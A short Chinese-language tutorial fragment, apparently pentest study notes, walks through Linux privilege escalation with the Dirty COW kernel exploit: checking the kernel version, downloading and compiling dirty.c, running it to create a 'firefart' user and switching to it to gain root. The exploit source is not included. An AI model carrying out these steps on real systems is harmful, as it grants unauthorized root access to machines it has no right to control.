    0x30 dirtycow（脏牛）提权

    1. 2007年发行至2016年10月18日修复
    2. Linux kernel>2.6.22
    3. uname -r #查看内核版本
    5. 下载dirty.c到/tmp
    6. useradd test #添加普通用户
    7. useradd -s /bin/bash test #修改test的登录shell，默认是/bin/sh
    8. su test #切换到用户test
    9. gcc -pthread -lcrypt dirty.c -o dirty #编译dirty.c，生成执行文件dirty
    10. id #查看用户权限
    11. ./dirty password #执行提权程序，密码设为password
    12. 要等~
    13. su firefart #切换到程序预设的用户名，密码就是刚设的password
    14. id #已经是root权限
